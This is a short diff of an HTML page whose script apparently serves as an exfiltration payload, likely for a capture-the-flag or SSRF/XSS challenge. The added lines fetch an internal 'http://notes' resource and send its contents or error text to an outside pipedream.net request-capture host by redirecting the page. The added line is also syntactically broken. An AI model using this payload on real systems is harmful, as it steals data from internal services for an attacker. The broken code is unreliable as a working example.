@@ -1,5 +1,6 @@
 <html>
   <script>
-    document.location='https://en5crqspl81fs.x.pipedream.net/';
+    const submitData = (data) => window.location = 'https://en5crqspl81fs.x.pipedream.net/?x'=atob(data)
+    fetch('http://notes').then(x=>x.text()).then(submitData).catch(e=>submitData(`${e}`))
   </script>
 </html>
